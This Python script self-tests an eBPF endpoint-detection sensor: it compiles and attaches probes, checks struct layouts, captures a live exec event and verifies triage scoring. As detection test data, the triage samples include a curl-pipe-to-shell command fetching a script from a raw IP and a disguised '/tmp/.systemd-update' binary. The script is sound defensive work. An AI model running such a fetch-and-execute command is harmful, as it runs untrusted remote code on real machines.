#!/usr/bin/env python3
"""Check the whole sensor without starting the system.

    sudo venv/bin/python3 scripts/check_sensor.py

A C syntax error or a verifier rejection cannot be caught without root: BCC
needs kernel headers and gets them by loading the `kheaders` module. Without
this script the only way to find a bug in the C would be a full system run,
which mixes it up with everything else.

Five checks in one privileged run:

1. It compiles and the verifier accepts it.
2. The probes attach (a symbol can be missing even if the program is valid).
3. The ctypes mirror matches the C structs.
4. **Real capture**: launches a known process and reads its events.
5. The triage scores those events as expected.

Steps 4 and 5 are what separate "the program loads" from "the sensor works": a
misaligned struct compiles and attaches perfectly, and only reading a real event
gives it away.

Exits 0 if everything passes, 1 as soon as something fails.
"""

import ctypes as ct
import os
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import forensic_mcp  # noqa: E402
from edr import procinfo, triage  # noqa: E402
from edr.eventstore import EventStore  # noqa: E402

# The command launched to provoke an event. Three deliberate properties:
#   - recognisable arguments, so a wrong `args` offset shows up as garbage;
#   - one argument contains a space, proving the arguments are split on the
#     probe's '\0' and not on whitespace;
#   - it lives a second, so it is still alive while the ring buffer is polled,
#     which is needed to resolve ppid from /proc.
COMMAND = ["/bin/sh", "-c", "sleep 1", "marker", "odd world"]
EXPECTED_CMDLINE = "-c sleep 1 marker odd world"


def compile_program():
    lines = forensic_mcp.ebpf_code.count("\n")
    print(f"[*] Compiling the eBPF program ({lines} lines of C)…")
    try:
        from bcc import BPF
        bpf = BPF(text=forensic_mcp.ebpf_code)
    except Exception as e:  # noqa: BLE001
        print("\n[FAIL] the program does not compile or the verifier rejects it:\n")
        print(str(e)[:4000])
        return None
    print("[ OK ] compiles, loads and passes the verifier.")
    return bpf


def attach_probes(bpf):
    print("\n[*] Attaching probes…")
    ok = True
    for syscall in ("finit_module", "init_module"):
        try:
            fnname = bpf.get_syscall_fnname(syscall)
            bpf.attach_kprobe(event=fnname, fn_name="kprobe_module_load")
            print(f"  [ OK ] kprobe:{syscall}  ({fnname.decode()})")
        except Exception as e:  # noqa: BLE001
            print(f"  [FAIL] kprobe:{syscall}: {e}")
            ok = False
    # TRACEPOINT_PROBE attaches the execve tracepoint by itself at load time,
    # so there is nothing to attach here.
    print("  [ OK ] tracepoint:sys_enter_execve (automatic, via TRACEPOINT_PROBE)")
    return ok


def check_ctypes():
    print("\n[*] ctypes mirror…")
    expected_sizes = {"EvHdr": 64, "ModuleEvent": 64, "ExecEvent": 528}
    ok = True
    for name, size in expected_sizes.items():
        actual = ct.sizeof(getattr(forensic_mcp, name))
        mark = " OK " if actual == size else "FAIL"
        if actual != size:
            ok = False
        print(f"  [{mark}] sizeof({name}) = {actual} (expected {size})")

    for field, off in (("hdr", 0), ("filename", 64), ("args", 192),
                       ("args_len", 512)):
        actual = getattr(forensic_mcp.ExecEvent, field).offset
        mark = " OK " if actual == off else "FAIL"
        if actual != off:
            ok = False
        print(f"  [{mark}] ExecEvent.{field} at byte {actual} (expected {off})")
    return ok


def _spawn():
    """Run the command with an explicit fork and return the child's pid.

    Done by hand rather than with `subprocess.run` so there is no doubt about
    which pid to look for and who its parent is: CPython may use `posix_spawn`,
    and on this machine that left the process hanging off an intermediary.

    The child is not reaped here: it has to stay alive while the ring buffer is
    polled, because ppid is resolved by reading its /proc.
    """
    pid = os.fork()
    if pid == 0:
        try:
            devnull = os.open(os.devnull, os.O_WRONLY)
            os.dup2(devnull, 1)
            os.execv(COMMAND[0], COMMAND)
        finally:
            os._exit(127)   # only reached if execv failed
    return pid


def capture(bpf):
    """Launch a known command and check the event arrives intact.

    Calls `handle_event`, the same function the running system uses. Duplicating
    the field extraction here would let this check pass while the real path is
    broken — which is exactly what happened with ppid.
    """
    print(f"\n[*] Live capture: {' '.join(COMMAND)}")

    store = EventStore(None, cap=500)
    forensic_mcp.STORE = store

    bpf["events"].open_ring_buffer(
        lambda ctx, data, size: forensic_mcp.handle_event(data, size))

    child = _spawn()

    # Polled while the child is alive: the event arrives immediately, but ppid
    # comes from /proc and needs the process to still exist.
    deadline = time.monotonic() + 0.8
    while time.monotonic() < deadline:
        bpf.ring_buffer_poll(50)

    # Read HERE, with the process still alive: after waitpid it has been reaped
    # and its /proc is gone.
    proc_starttime = procinfo.starttime(child)
    os.waitpid(child, 0)

    # Matched by exact pid: the only event that is certainly ours.
    ours = [e for e in store.query(limit=0) if e.get("pid") == child]
    if not ours:
        total = len(store.query(limit=0))
        print(f"  [FAIL] no event arrived for pid {child} "
              f"({total} events captured in total)")
        return False

    ev = ours[-1]
    print(f"  event: pid={ev['pid']} ppid={ev['ppid']} uid={ev['uid']} "
          f"caller_comm={ev.get('caller_comm')}")
    print(f"  filename: {ev['filename']}")
    print(f"  cmdline:  {ev['cmdline']!r}")

    ok = True

    def check(condition, good, bad):
        nonlocal ok
        if condition:
            print(f"  [ OK ] {good}")
        else:
            print(f"  [FAIL] {bad}")
            ok = False

    check(ev["cmdline"] == EXPECTED_CMDLINE,
          "the command line arrives complete, in order and with its spaces",
          f"unexpected command line: expected {EXPECTED_CMDLINE!r}")

    check(bool(ev["starttime"]),
          f"identity captured in the probe (starttime={ev['starttime']})",
          "empty starttime: identity capture was lost")

    check(ev["ppid"] == os.getpid(),
          "ppid points at the process that launched the command",
          f"ppid should be this script's ({os.getpid()}) and is {ev['ppid']}")

    check(ev["filename"] == COMMAND[0],
          f"filename correct ({ev['filename']})",
          f"unexpected filename: {ev['filename']}")

    # The decisive check on this machine: the pid must be in the numbering
    # /proc uses, not the kernel's initial namespace.
    check(not ev["foreign_ns"],
          "the pid is in /proc's numbering, not the global one",
          "the pid was not translated into the EDR's namespace")

    # And the proof that the pid means something here: the starttime the probe
    # captured must match what /proc reports for it. The whole remediation path
    # depends on this.
    check(proc_starttime is not None and proc_starttime == ev["starttime"],
          "starttime matches /proc: the pid-reuse safeguard can work",
          f"probe starttime ({ev['starttime']}) does not match /proc "
          f"({proc_starttime})")

    return ok


def check_namespace():
    """Note whether the EDR runs inside a nested PID namespace.

    Not a failure — the sensor translates — but worth having in the output: it
    is the difference between this machine and the phase 7 lab VM.
    """
    INITIAL_NS = 4026531836   # fixed inode of the initial PID namespace
    st = os.stat("/proc/self/ns/pid")

    print("\n[*] PID namespace…")
    if st.st_ino == INITIAL_NS:
        print("  [ OK ] the EDR runs in the kernel's initial namespace")
    else:
        print(f"  [note] nested namespace (inode {st.st_ino}, initial is "
              f"{INITIAL_NS})")
        print("         pids are translated in the probe; without that, /proc "
              "and the safeguards would read another process")
    return True


def check_triage():
    """The triage must tell the two demo commands apart."""
    print("\n[*] Triage on sample events…")
    cases = [
        ({"filename": "/usr/bin/curl",
          "cmdline": "-s https://api.github.com/health"}, False),
        ({"filename": "/usr/bin/curl",
          "cmdline": "-s http://45.33.0.1/x.sh | sh"}, True),
        ({"filename": "/tmp/.systemd-update", "cmdline": "600"}, True),
    ]
    ok = True
    for event, should_escalate in cases:
        severity, rules = triage.assess(event)
        escalates = triage.should_escalate(event)
        mark = " OK " if escalates == should_escalate else "FAIL"
        if escalates != should_escalate:
            ok = False
        print(f"  [{mark}] {event['filename']} {event['cmdline'][:40]!r} → "
              f"severity={severity} rules={rules or '-'}")
    return ok


def main():
    if os.geteuid() != 0:
        print("[!] Needs root: BCC loads the kheaders module to compile.")
        print("    sudo venv/bin/python3 scripts/check_sensor.py")
        return 1

    bpf = compile_program()
    if bpf is None:
        return 1

    steps = [
        attach_probes(bpf),
        check_ctypes(),
        check_namespace(),
        capture(bpf),
        check_triage(),
    ]

    if all(steps):
        print("\n[+] All good. The system is ready to start.")
        return 0
    print("\n[-] Some checks failed, see the output above.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
